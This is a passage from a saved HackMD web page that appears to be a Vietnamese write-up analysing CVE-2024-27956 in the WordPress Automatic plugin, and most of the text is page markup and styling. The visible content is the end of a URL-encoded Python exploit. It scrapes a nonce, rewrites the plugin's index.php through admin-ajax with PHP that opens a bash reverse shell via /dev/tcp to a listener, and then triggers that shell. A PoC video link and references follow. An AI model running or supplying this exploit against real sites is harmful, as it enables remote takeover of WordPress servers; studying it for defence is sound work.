221%22%2C%20%22Sec-Fetch-Dest%22%3A%20%22document%22%2C%20%22Sec-Fetch-Mode%22%3A%20%22navigate%22%2C%20%22Sec-Fetch-Site%22%3A%20%22none%22%2C%20%22Sec-Fetch-User%22%3A%20%22%3F1%22%7D%0Ar%20%3D%20session.get(edit_wp_automatic_url%20%2C%20headers%3Dheaders)%0A%0Ar%20%3D%20r.text.split('%5Cn')%0Afor%20line%20in%20r%3A%0A%20%20%20%20if%20'input%20type%3D%22hidden%22%20id%3D%22nonce%22%20name%3D%22nonce'%20in%20line%3A%0A%20%20%20%20%20%20%20%20break%0Aline%20%3D%20line.split('%20')%0Anonce%20%3D%20line%5B4%5D.replace('value%3D%22'%2C'').replace('%22'%2C'')%0A%0A%23%20Use%20the%20%60nonce%60%20we%20just%20found%20to%20upload%20the%20shell%0A%23%20You%20can%20change%20payload_data%5B%22newcontent%22%5D%20to%20another%20PHP%20shell%20if%20you%20want%0Aupload_url%20%3D%20domain%20%2B%20%22%2Fwp-admin%2Fadmin-ajax.php%22%0Apayload_data%20%3D%20%7B%22nonce%22%3A%20%22e8876343e3%22%2C%20%22_wp_http_referer%22%3A%20%22%2Fwordpress%2Fwp-admin%2Fplugin-editor.php%3Ffile%3Dwp-automatic%252Findex.php%26plugin%3Dwp-automatic%252Fwp-automatic.php%22%2C%20%22newcontent%22%3A%20%22%3C%3Fphp%20%5Cnexec(%5C%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F1414%200%3E%261'%5C%22)%3B%5Cn%3F%3E%22%2C%20%22action%22%3A%20%22edit-theme-plugin-file%22%2C%20%22file%22%3A%20%22wp-automatic%2Findex.php%22%2C%20%22plugin%22%3A%20%22wp-automatic%2Fwp-automatic.php%22%2C%20%22docs-list%22%3A%20''%7D%0Apayload_data%5B%22nonce%22%5D%20%3D%20nonce%0Apayload_data%5B%22newcontent%22%5D%20%3D%20%22%3C%3Fphp%20%5Cnexec(%5C%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F%22%20%2B%20listenIP%20%2B%20%22%2F%22%20%2B%20listenPort%20%2B%20%22%200%3E%261'%5C%22)%3B%5Cn%3F%3E%22%0A%0Ar%20%3D%20session.post(upload_url%2C%20data%3Dpayload_data)%0A%0A%0A%23%23%20Visit%20the%20link%20to%20get%20the%20shell%0Ashell_url%20%3D%20%22http%3A%2F%2Flocalhost%3A80%2Fwordpress%2Fwp-content%2Fplugins%2Fwp-automatic%2Findex.php%22%0Aprint(%22Reverse%20shell%20is%20sending%22)%0Ar%20%3D%20requests.get(shell_url%2C%20headers%3Dheaders)%0Aprint(%22Shell%20is%20closed%22)%0A%60%60%60%0A%0A%23%23%20POC%20Video%20clip%0A%0Ahttps%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1KZlFzB7NjET7A7xZd2NfRlL0vufQyF1M%2Fview%3Fusp%3Dsharing%0A%0A%23%23%20References%3A%0A-%20https%3A%2F%2Fgithub.com%2Ftruonghuuphuc%2FCVE-2024-27956%2Ftree%2Fmain%0A-%20https%3A%2F%2Ftwitter.com%2FMrTuxracer%2Fstatus%2F1784229071460692232%3Fref_src%3Dtwsrc%255Egoogle%257Ctwcamp%255Eserp%257Ctwgr%255Etweet%0A-%20https%3A%2F%2Fpatchstack.com%2Farticles%2Fcritical-vulnerabilities-patched-in-wordpress-automatic-plugin%2F%0A-%20https%3A%2F%2Fthereviewhive.blog%2Fwp-automatic-plugin-patch-now-for-critical-flaw-cve-2024-27956%2F%0A-%20https%3A%2F%2Fsecnhack.in%2Fupload-shell-on-wordpress-site%2F%0A-%20https%3A%2F%2Fgithub.com%2Fpentestmonkey%2Fphp-reverse-shell%2Fblob%2Fmaster%2Fphp-reverse-shell.php%0A-%20https%3A%2F%2Fsevenlayers.com%2Findex.php%2F179-wordpress-plugin-reverse-shell%0A%0A","viewMode":"publish","isOwner":false,"isSignIn":false,"isLiked":false,"isBookmarked":false,"publishType":"view","commentCount":0,"isNotesRecommendationsEnabled":true,"recommendedNotes":[{"id":"43129e21-c9ce-49ec-b09f-82a26454d2a0","title":"HTB%20Blind%20XSS","brief":"%60%60","lastchangeAt":"2025-03-12T03%3A59%3A04.502Z","publishLink":"%40cheese00%2FH1U4Vu6sJe"},{"id":"6f008f6c-6dc9-46d8-9104-ffc7f2082b2f","title":"Flag%20Command","brief":"Embark%20on%20the%20%26quot%3BDimensional%20Escape%20Quest%26quot%3B%20where%20you%20wake%20up%20in%20a%20mysterious%20forest%20maze%20that%26%2339%3Bs%20not%20quite%20of%20this%20world.%20Navigate%20singing%20squirrels%2C%20mischievous%20nymphs%2C%20and%20grumpy%20wizards%20in%20a%20whimsical%20labyrinth%20that%20may%20lead%20to%20otherworldly%20surprises.%20Will%20you%20conquer%20the%20enchanted%20maze%20or%20find%20yourself%20lost%20in%20a%20different%20dimension%20of%20magical%20challenges%3F%20The%20journey%20unfolds%20in%20this%20mystical%20escape!","lastchangeAt":"2025-02-04T10%3A18%3A45.448Z","publishLink":"%40cheese00%2FH1iiwxC_1e"},{"id":"b24a4cd5-80f4-48e5-878c-3e95639a28cd","title":"Custom%20Terminal","brief":"V%C3%A0o%20m%E1%BB%99t%20ng%C3%A0y%20%C4%91%E1%BA%B9p%20tr%E1%BB%9Di%20m%C3%ACnh%20%C4%91%C3%A3%20qu%C3%A1%20m%E1%BB%87t%20m%E1%BB%8Fi%20v%E1%BB%9Bi%20terminal%20tr%E1%BA%AFng%20%C4%91en%20c%E1%BB%A7a%20Mac%20n%C3%AAn%20m%C3%ACnh%20%C4%91%C3%A3%20t%C3%ACm%20c%C3%A1ch%20%C4%91%E1%BB%83%20custom%20n%C3%B3","lastchangeAt":"2025-01-09T03%3A53%3A02.771Z","publishLink":"%40cheese00%2FHk0jGh38yx"},{"id":"2289d7ef-8aab-4542-9098-95ac51f13ad6","title":"Tui%20l%C3%A0m%20lab%20XSS","brief":"M%E1%BB%99t%20ng%C3%A0y%20%C4%91%E1%BA%B9p%20tr%E1%BB%9Di%20v%C3%AC%20th%E1%BA%A5y%20m%C3%ACnh%20qu%C3%A1%20g%C3%A0%20khi%20g%E1%BA%B7p%20c%C3%A1c%20l%E1%BB%97i%20XSS%20n%C3%AAn%20m%C3%ACnh%20quy%E1%BA%BFt%20%C4%91%E1%BB%8Bnh%20t%C3%ACm%20ki%E1%BA%BFm%20th%C3%AAm%20c%C3%A1c%20lab%20XSS%20%C4%91%E1%BB%83%20l%C3%A0m%20v%C3%A0%20%C4%91%C3%A2y%20l%C3%A0%20trang%20m%C3%ACnh%20s%E1%BA%BD%20d%C3%B9ng%20%C4%91%E1%BB%83%20tu%20luy%E1%BB%87n%20th%C3%AAm%20k%E1%BB%B9%20n%C4%83ng%20XSS%20c%E1%BB%A7a%20b%E1%BA%A3n%20th%C3%A2n.%20Okie%20G%E1%BA%B9t%20G%C3%B4","lastchangeAt":"2024-09-23T08%3A27%3A10.281Z","publishLink":"%40cheese00%2FSyyVhNpnR"}],"lastChangeUserInfo":{"name":"Chi%20Lam","path":"cheese00","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FAEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm%3Ds96-c"}}`);
  (function () {
    const decodeStringProps = (props) => {
      for (const key in props) {
        if (typeof props[key] === 'string') {
          props[key] = decodeURIComponent(props[key])
        } else if (typeof props[key] === 'object') {
          decodeStringProps(props[key])
        }
      }
    }
    decodeStringProps(window.publishProps)
  })()
</script>

    <script src="./Phân tích CVE-2024-27956 - HackMD_files/embed.js.tải xuống"></script><style>@keyframes _spin_evhv6_1{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes _wave_evhv6_1{0%{transform:rotate(0)}50%{transform:rotate(20deg)}to{transform:rotate(0)}}@keyframes _heartBeat_evhv6_1{0%{transform:scale(1)}50%{transform:scale(1.08)}to{transform:scale(1)}}@keyframes _flash_evhv6_1{0%,50%,to{opacity:1}25%,75%{opacity:.2}}@keyframes _bounce_evhv6_1{0%,20%,53%,to{transform:translateZ(0)}40%,43%{transform:translate3d(0,-30px,0) scaleY(1.1)}70%{transform:translate3d(0,-15px,0) scaleY(1.05)}80%{transform:translateZ(0) scaleY(.95)}90%{transform:translate3d(0,-4px,0) scaleY(1.02)}}@keyframes _rubberBand_evhv6_1{0%{transform:scaleZ(1)}30%{transform:scale3d(1.25,.75,1)}40%{transform:scale3d(.75,1.25,1)}50%{transform:scale3d(1.15,.85,1)}65%{transform:scale3d(.95,1.05,1)}75%{transform:scale3d(1.05,.95,1)}to{transform:scaleZ(1)}}@keyframes _headShake_evhv6_1{0%{transform:translate(0)}6.5%{transform:translate(-6px) rotateY(-9deg)}18.5%{transform:translate(5px) rotateY(7deg)}31.5%{transform:translate(-3px) rotateY(-5deg)}43.5%{transform:translate(2px) rotateY(3deg)}50%{transform:translate(0)}}@keyframes _tada_evhv6_1{0%{transform:scaleZ(1)}10%,20%{transform:scale3d(.9,.9,.9) rotate3d(0,0,1,-3deg)}30%,50%,70%,90%{transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,3deg)}40%,60%,80%{transform:scale3d(1.1,1.1,1.1) rotate3d(0,0,1,-3deg)}to{transform:scaleZ(1)}}._overlay_evhv6_157{position:fixed;inset:0;z-index:1000000006;display:-ms-flexbox;display:flex;-ms-flex-pack:center;justify-content:center;-ms-flex-align:center;align-items:center;background-color:#0f0f0f99}._layoutDefault_evhv6_170{position:fixed;right:20px;bottom:20px;z-index:2147483000;width:auto;height:auto;max-width:95vw;display:-ms-flexbox;display:flex;background-color:transparent;border-radius:5px;box-shadow:#0f0f0f0d 0 0 0 1px,#0f0f0f1a 0 3px 6px,#0f0f0f33 0 9px 24px;opacity:0}._layoutModal_evhv6_186{position:relative;z-index:2147483000;width:700px;height:auto;max-width:95vw;display:-ms-flexbox;display:flex;background-color:transparent;border-radius:5px;box-shadow:#0f0f0f0d 0 0 0 1px,#0f0f0f1a 0 3px 6px,#0f0f0f33 0 9px 24px;opacity:0}._popupContainer_evhv6_200{display:-ms-flexbox;display:flex;width:100%;border-radius:5px;overflow-y:auto}._popupContainer_evhv6_200 iframe{border-radius:5px;max-height:95vh}._loadingIndicator_evhv6_212{position:absolute;z-index:2147483000;display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;width:50px;height:50px;border-radius:50%;color:#444;background-color:#f5f5f5}._loadingIndicatorNoOverlay_evhv6_225{position:fixed;right:10px;bottom:10px}._loadingIndicator_evhv6_212 svg{width:20px;height:20px;animation:_spin_evhv6_1 1.618s linear infinite}._emoji_evhv6_237{position:absolute;top:-21px;left:-21px;display:inline-block;font-size:42px;line-height:1}._animate__wave_evhv6_246{animation:_wave_evhv6_1 1s ease-in-out 20}._animate__heart-beat_evhv6_250{animation:_heartBeat_evhv6_1 1.3s ease-in-out 20}._animate__flash_evhv6_254{animation:_flash_evhv6_1 2.5s 20}._animate__bounce_evhv6_258{animation:_bounce_evhv6_1 1.5s 20;-ms-transform-origin:center bottom;transform-origin:center bottom}._animate__rubber-band_evhv6_263{animation:_rubberBand_evhv6_1 1.5s 20}._animate__head-shake_evhv6_267{animation:_headShake_evhv6_1 1.5s ease-in-out 20}._animate__tada_evhv6_271{animation:_tada_evhv6_1 1.5s 20}._animate__spin_evhv6_275{animation:_spin_evhv6_1 1.618s linear 20}@media (max-height: 1000px){._popupContainer_evhv6_200 iframe{max-height:85vh}}@media (max-width: 576px){._popupContainer_evhv6_200 iframe{max-height:70vh}._layoutDefault_evhv6_170,._layoutModal_evhv6_186{max-width:calc(100% - 40px)}}
/*$vite$:1*/</style>

    
<style id="googleidentityservice_button_styles" nonce="">.qJTHM{-webkit-user-select:none;color:#202124;direction:ltr;-webkit-touch-callout:none;font-family:"Roboto-Regular",arial,sans-serif;-webkit-font-smoothing:antialiased;font-weight:400;margin:0;overflow:hidden;-webkit-text-size-adjust:100%}.ynRLnc{left:-9999px;position:absolute;top:-9999px}.L6cTce{display:none}.bltWBb{word-break:break-all}.hSRGPd{color:#1a73e8;cursor:pointer;font-weight:500;text-decoration:none}.Bz112c-W3lGp{height:16px;width:16px}.Bz112c-E3DyYd{height:20px;width:20px}.Bz112c-r9oPif{height:24px;width:24px}.Bz112c-r4WDKb{height:42px;width:42px}.Bz112c-uaxL4e{-webkit-border-radius:10px;border-radius:10px}.LgbsSe-Bz112c{display:block}.S9gUrf-YoZ4jf,.S9gUrf-YoZ4jf *{border:none;margin:0;padding:0}.fFW7wc-ibnC6b>.aZ2wEe>div{border-color:#4285f4}.P1ekSe-ZMv3u>div:nth-child(1){background-color:#1a73e8!important}.P1ekSe-ZMv3u>div:nth-child(2),.P1ekSe-ZMv3u>div:nth-child(3){background-image:linear-gradient(to right,rgba(255,255,255,.7),rgba(255,255,255,.7)),linear-gradient(to right,#1a73e8,#1a73e8)!important}.haAclf{display:inline-block}.nsm7Bb-HzV7m-LgbsSe{-webkit-border-radius:4px;border-radius:4px;-webkit-box-sizing:border-box;box-sizing:border-box;-webkit-transition:background-color .218s,border-color .218s;transition:background-color .218s,border-color .218s;-webkit-user-select:none;-webkit-appearance:none;background-color:#fff;background-image:none;border:1px solid #dadce0;color:#3c4043;cursor:pointer;font-family:"Google Sans",arial,sans-serif;font-size:14px;height:40px;letter-spacing:0.25px;outline:none;overflow:hidden;padding:0 12px;position:relative;text-align:center;vertical-align:middle;white-space:nowrap;width:auto}@media screen and (-ms-high-contrast:active){.nsm7Bb-HzV7m-LgbsSe{border:2px solid windowText;color:windowText}}@media screen and (preferes-contrast:more){.nsm7Bb-HzV7m-LgbsSe{color:#000}}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe{font-size:14px;height:32px;letter-spacing:0.25px;padding:0 10px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe{font-size:11px;height:20px;letter-spacing:0.3px;padding:0 8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe{padding:0;width:40px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe{width:32px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe{width:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK{-webkit-border-radius:20px;border-radius:20px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.pSzOP-SxQuSe{-webkit-border-radius:16px;border-radius:16px}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK.purZT-SxQuSe{-webkit-border-radius:10px;border-radius:10px}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc{border:none;color:#fff}.nsm7Bb-HzV7m-LgbsSe.MFS4be-v3pZbf-Ia7Qfc{background-color:#1a73e8}.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{background-color:#202124;color:#e8eaed}@media screen and (prefers-contrast:more){.nsm7Bb-HzV7m-LgbsSe.MFS4be-JaPV2b-Ia7Qfc{color:#fff}}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:18px;margin-right:8px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:14px;min-width:14px;width:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{height:10px;min-width:10px;width:10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin-left:8px;margin-right:-4px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:10px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:8px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c{padding:4px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:3px;border-top-left-radius:3px;-webkit-border-bottom-left-radius:3px;border-bottom-left-radius:3px;display:-webkit-box;display:-webkit-flex;display:flex;justify-content:center;-webkit-align-items:center;align-items:center;background-color:#fff;height:36px;margin-left:-10px;margin-right:12px;min-width:36px;width:36px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c,.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf .nsm7Bb-HzV7m-LgbsSe-Bz112c{margin:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:28px;margin-left:-8px;margin-right:10px;min-width:28px;width:28px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{height:16px;margin-left:-6px;margin-right:8px;min-width:16px;width:16px}.nsm7Bb-HzV7m-LgbsSe.Bz112c-LgbsSe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:3px;border-radius:3px;margin-left:2px;margin-right:0;padding:0}.nsm7Bb-HzV7m-LgbsSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.nsm7Bb-HzV7m-LgbsSe.pSzOP-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:14px;border-radius:14px}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:8px;border-radius:8px}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-bN97Pc-sM5MNb{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;-webkit-flex-direction:row;flex-direction:row;justify-content:space-between;-webkit-flex-wrap:nowrap;flex-wrap:nowrap;height:100%;position:relative;width:100%}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX{justify-content:center}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:1;flex-grow:1;font-family:"Google Sans",arial,sans-serif;font-weight:500;overflow:hidden;text-overflow:ellipsis;vertical-align:top}.nsm7Bb-HzV7m-LgbsSe.purZT-SxQuSe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-weight:300}.nsm7Bb-HzV7m-LgbsSe .oXtfBe-l4eHX .nsm7Bb-HzV7m-LgbsSe-BPrWId{-webkit-flex-grow:0;flex-grow:0}.nsm7Bb-HzV7m-LgbsSe .nsm7Bb-HzV7m-LgbsSe-MJoBVe{-webkit-transition:background-color .218s;transition:background-color .218s;bottom:0;left:0;position:absolute;right:0;top:0}.nsm7Bb-HzV7m-LgbsSe:hover,.nsm7Bb-HzV7m-LgbsSe:focus{-webkit-box-shadow:none;box-shadow:none;border-color:rgb(210,227,252);outline:none}.nsm7Bb-HzV7m-LgbsSe:focus-within{outline:2px solid #00639b;border-color:transparent}.nsm7Bb-HzV7m-LgbsSe:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.08)}.nsm7Bb-HzV7m-LgbsSe:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(66,133,244,.1)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:hover .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.24)}.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:active .nsm7Bb-HzV7m-LgbsSe-MJoBVe,.nsm7Bb-HzV7m-LgbsSe.MFS4be-Ia7Qfc:focus .nsm7Bb-HzV7m-LgbsSe-MJoBVe{background:rgba(255,255,255,.32)}.nsm7Bb-HzV7m-LgbsSe .n1UuX-DkfjY{-webkit-border-radius:50%;border-radius:50%;display:-webkit-box;display:-webkit-flex;display:flex;height:20px;margin-left:-4px;margin-right:8px;min-width:20px;width:20px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId{font-family:"Roboto";font-size:12px;text-align:left}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .ssJRIf,.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .fmcmS{overflow:hidden;text-overflow:ellipsis}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;color:#5f6368;fill:#5f6368;font-size:11px;font-weight:400}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#e8eaed;fill:#e8eaed}@media screen and (prefers-contrast:more){.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff,.nsm7Bb-HzV7m-LgbsSe.jVeSEe.MFS4be-Ia7Qfc .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff{color:#000;fill:#000}}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-BPrWId .K4efff .Bz112c{height:18px;margin:-3px -3px -3px 2px;min-width:18px;width:18px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-top-left-radius:0;border-top-left-radius:0;-webkit-border-bottom-left-radius:0;border-bottom-left-radius:0;-webkit-border-top-right-radius:3px;border-top-right-radius:3px;-webkit-border-bottom-right-radius:3px;border-bottom-right-radius:3px;margin-left:12px;margin-right:-10px}.nsm7Bb-HzV7m-LgbsSe.jVeSEe.JGcpL-RbRzK .nsm7Bb-HzV7m-LgbsSe-Bz112c-haAclf{-webkit-border-radius:18px;border-radius:18px}.L5Fo6c-sM5MNb{border:0;display:block;left:0;position:relative;top:0}.L5Fo6c-bF1uUb{-webkit-border-radius:4px;border-radius:4px;bottom:0;cursor:pointer;left:0;position:absolute;right:0;top:0}.L5Fo6c-bF1uUb:focus{border:none;outline:none}sentinel{}</style><style></style><link rel="stylesheet" type="text/css" href="./Phân tích CVE-2024-27956 - HackMD_files/fretboard.7a98c97ae43fb8ca354b.css"><script id="ppas_container_configuration" data-appid="8b665e66-46fc-4c65-aef4-4c3429ff4551" data-host="hackmd.piwik.pro"></script><link id="googleidentityservice" type="text/css" media="all" href="./Phân tích CVE-2024-27956 - HackMD_files/style" rel="stylesheet"><meta http-equiv="origin-trial" content="A8o5T4MyEkRZqLA9WeG2XTFdV5tsX2Prg85xyQ+RL1btVuybB1K/EQ+7JUsPK+J32oBMTnsoF9B4A+qTlL6efgQAAABweyJvcmlnaW4iOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IkZlZENtQnV0dG9uTW9kZSIsImV4cGlyeSI6MTc0NDY3NTIwMCwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="></head>

<body style="--hmd-comment-panel-width: 348px;" theme="light" data-view-theme="light" class="pretty-comment-panel"><span data-radix-focus-guard="" tabindex="0" style="outline: none; opacity: 0; position: fixed; pointer-events: none;"></span>
    <div id="toasts-container" class="toasts-container z-[2000]"><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div><div><div class="pointer-events-auto ml-auto mr-auto flex w-fit flex-col justify-end"></div></div></div>
    <div id="publish-page"><div id="meta-title-tags" class="sticky top-0 z-[1000] w-full max-w-full overflow-hidden"><div class="sticky top-0 flex h-auto min-h-[50px] w-full max-w-full items-center justify-between gap-5 overflow-hidden bg-background-blur px-4 py-2.5 backdrop-blur-[12px]"><div class="flex max-w-[75%] items-center overflow-hidden" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-3" data-state="closed"><div class="min-h-[38px] w-full max-w-full items-center overflow-auto text-text-subtle grid grid-cols-[repeat(auto-fit,_minmax(0,_min-content))] grid-rows-1 text-lg leading-lg gap-0" style="grid-template-columns: repeat(2, minmax(0px, max-content));"><span class="flex max-w-full flex-row items-center gap-0 text-text-default"><button class="p-0 m-0 bg-transparent border-none truncate hocus:text-text-default text-lg leading-lg flex max-w-[208px] flex-row items-center gap-1"><span class="inline-flex flex-shrink-0 justify-center items-center text-[20px] leading-[20px] w-fit h-fit text-icon-subtle"><span class="relative flex-shrink-0 p-[2px]" style="width: 28px; height: 28px;"><span class="relative flex h-full w-full rounded-full bg-cover bg-center after:absolute after:left-[-2px] after:top-[-2px] after:rounded-full after:border after:border-solid after:border-prime-border after:hidden after:h-[calc(100%+4px)] after:w-[calc(100%+4px)]" style="background-image: url(&quot;https://lh3.googleusercontent.com/a/AEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm=s96-c&quot;);"></span></span></span><span class="truncate"><a class="inline-flex max-w-full text-inherit hocus:text-inherit hocus:no-underline" href="https://hackmd.io/@cheese00" data-state="closed"><span class="truncate text-lg font-semibold leading-lg">Chi Lam</span></a></span></button></span><span class="flex max-w-full flex-row items-center gap-0 text-text-default"><span class="inline-flex flex-shrink-0 justify-center items-center w-5 h-5 text-[20px] leading-[20px] text-icon-subtle"><svg width="100%" height="100%" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.75 3.50474C14.0489 3.67733 14.1514 4.05957 13.9788 4.3585L7.10377 16.2664C6.93118 16.5653 6.54893 16.6677 6.25 16.4951C5.95107 16.3225 5.84865 15.9403 6.02124 15.6414L12.8962 3.7335C13.0688 3.43457 13.4511 3.33215 13.75 3.50474Z" fill="currentColor"></path></svg></span><button class="p-0 m-0 bg-transparent border-none flex flex-row items-center truncate hocus:text-text-default text-lg leading-lg gap-1.5 w-full overflow-hidden"><span class="inline-flex flex-shrink-0 justify-center items-center text-[20px] leading-[20px] w-fit h-fit text-icon-subtle"><span class="inline-flex ph" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"><svg width="100%" height="100%" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.6922 6.43281L12.3172 2.05781C12.2591 1.99979 12.1902 1.95378 12.1143 1.92241C12.0384 1.89105 11.9571 1.87494 11.875 1.875H4.375C4.04348 1.875 3.72554 2.0067 3.49112 2.24112C3.2567 2.47554 3.125 2.79348 3.125 3.125V16.875C3.125 17.2065 3.2567 17.5245 3.49112 17.7589C3.72554 17.9933 4.04348 18.125 4.375 18.125H15.625C15.9565 18.125 16.2745 17.9933 16.5089 17.7589C16.7433 17.5245 16.875 17.2065 16.875 16.875V6.875C16.8751 6.7929 16.859 6.71159 16.8276 6.63572C16.7962 6.55985 16.7502 6.4909 16.6922 6.43281ZM12.5 4.00859L14.7414 6.25H12.5V4.00859ZM15.625 16.875H4.375V3.125H11.25V6.875C11.25 7.04076 11.3158 7.19973 11.4331 7.31694C11.5503 7.43415 11.7092 7.5 11.875 7.5H15.625V16.875ZM13.125 10.625C13.125 10.7908 13.0592 10.9497 12.9419 11.0669C12.8247 11.1842 12.6658 11.25 12.5 11.25H7.5C7.33424 11.25 7.17527 11.1842 7.05806 11.0669C6.94085 10.9497 6.875 10.7908 6.875 10.625C6.875 10.4592 6.94085 10.3003 7.05806 10.1831C7.17527 10.0658 7.33424 10 7.5 10H12.5C12.6658 10 12.8247 10.0658 12.9419 10.1831C13.0592 10.3003 13.125 10.4592 13.125 10.625ZM13.125 13.125C13.125 13.2908 13.0592 13.4497 12.9419 13.5669C12.8247 13.6842 12.6658 13.75 12.5 13.75H7.5C7.33424 13.75 7.17527 13.6842 7.05806 13.5669C6.94085 13.4497 6.875 13.2908 6.875 13.125C6.875 12.9592 6.94085 12.8003 7.05806 12.6831C7.17527 12.5658 7.33424 12.5 7.5 12.5H12.5C12.6658 12.5 12.8247 12.5658 12.9419 12.6831C13.0592 12.8003 13.125 12.9592 13.125 13.125Z" fill="currentColor"></path></svg></span></span><span class="truncate"><span class="inline-flex max-w-full" data-state="closed"><span class="truncate text-lg leading-lg">Phân tích CVE-2024-27956</span></span></span></button></span></div><div class="px-2"></div></div><span class="flex flex-row gap-3"><button class="rounded px-2.5 py-2 font-normal flex bg-transparent text-text-default border border-solid border-border-default hocus:bg-element-bg-hover hocus:border-element-border-hover hocus:text-text-emphasize focus:shadow-[0_0_0_2px_#77777733] disabled:bg-element-bg-disabled disabled:border-element-border-disabled disabled:text-element-text-disabled disabled:hocus:bg-element-bg-disabled disabled:hocus:border-element-border-disabled disabled:hocus:text-element-text-disabled disabled:border disabled:border-solid disabled:hocus:border disabled:hocus:border-solid community-button ui-view-theme gap-0.5 !py-1.5 !px-2 text-sm leading-sm" data-toggle="tooltip" data-placement="bottom" data-original-title="Select color mode" type="button" aria-haspopup="dialog" aria-expanded="false" aria-controls="radix-2" data-state="closed"><i 